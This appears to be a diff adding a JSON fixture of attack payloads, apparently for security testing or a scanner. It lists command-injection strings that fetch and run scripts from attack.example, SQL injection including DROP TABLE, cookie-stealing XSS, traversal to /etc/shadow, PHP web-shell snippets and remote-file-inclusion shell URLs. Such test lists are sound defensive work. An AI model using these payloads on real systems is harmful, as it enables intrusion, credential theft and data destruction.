@@ -1,0 +1,53 @@
+{
+  "command": [
+    "127.0.0.1; cat /etc/passwd",
+    "; id",
+    "$(id)",
+    "`whoami`",
+    "; /bin/sh -c id",
+    "| uname -a",
+    "& cmd.exe /c whoami",
+    "; powershell.exe -NoProfile -Command Get-Process",
+    "; Invoke-Expression (New-Object Net.WebClient).DownloadString(\"https://attack.example/p.ps1\")",
+    "&& curl https://attack.example/s.sh | sh",
+    ";iwr https://attack.example/file.ps1",
+    "image.jpg&bcdboot /r file.txt",
+    ";flock -u / whoami"
+  ],
+  "sqli": [
+    "1' OR 1=1-- -",
+    "1 UNION SELECT username,password FROM users",
+    "'; DROP TABLE users; --",
+    "1' AND SLEEP(5)-- -",
+    "0 UNION ALL SELECT NULL,NULL,version()"
+  ],
+  "xss": [
+    "<script>alert(document.cookie)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "<iframe src=\"javascript:alert(1)\"></iframe>",
+    "<script src=\"https://attack.example/x.js\"></script>"
+  ],
+  "traversal": [
+    "../../../../etc/passwd",
+    "../../../etc/shadow",
+    "/etc/passwd",
+    "../../../../windows/win.ini",
+    "../../../../proc/self/environ"
+  ],
+  "php": [
+    "<?php system($_GET['cmd']); ?>",
+    "<?php echo shell_exec('id'); ?>",
+    "eval(base64_decode('ZWNobyAiaGkiOw=='));",
+    "phpinfo();",
+    "file_put_contents('/var/www/x.php', $_POST['c']);",
+    "assert($_REQUEST['x']);"
+  ],
+  "rfi": [
+    "http://10.0.0.5/shell.txt",
+    "http://192.168.1.20/payload.php?",
+    "https://203.0.113.9/x.txt",
+    "ftp://198.51.100.7/a.php",
+    "http://evil.example/shell.txt?"
+  ]
+}
